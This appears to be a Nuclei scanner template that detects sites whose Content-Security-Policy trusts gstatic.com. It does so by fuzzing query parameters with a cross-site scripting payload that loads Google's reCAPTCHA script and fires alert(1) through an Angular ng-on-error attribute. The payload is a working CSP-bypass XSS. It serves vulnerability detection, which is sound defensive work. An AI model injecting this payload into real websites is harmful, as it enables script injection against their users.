flow: http(1) && headless(1)
headless:
- fuzzing:
  - fuzz:
    - '{{url_encode(injection)}}'
    mode: single
    part: query
    type: replace
  matchers:
  - dsl:
    - gstatic_recaptcha_csp_xss == true
    type: dsl
  payloads:
    injection:
    - <script src="https://www.gstatic.com/recaptcha/about/js/main.min.js"></script><img
      src=x ng-on-error="$event.target.ownerDocument.defaultView.alert(1)">
  steps:
  - action: navigate
    args:
      url: '{{BaseURL}}'
  - action: waitdialog
    args:
      max-duration: 5s
    name: gstatic_recaptcha_csp_xss
http:
- matchers:
  - condition: and
    internal: true
    part: header
    type: word
    words:
    - Content-Security-Policy
    - gstatic.com
  method: GET
  path:
  - '{{BaseURL}}'
id: gstatic-recaptcha-csp-bypass
info:
  author: renniepak,DhiyaneshDK
  metadata:
    verified: true
  name: Content-Security-Policy Bypass - GStatic reCAPTCHA
  reference:
  - https://github.com/renniepak/CSPBypass/blob/main/data.tsv
  severity: medium
  tags: xss,csp-bypass,gstatic-recaptcha,vuln
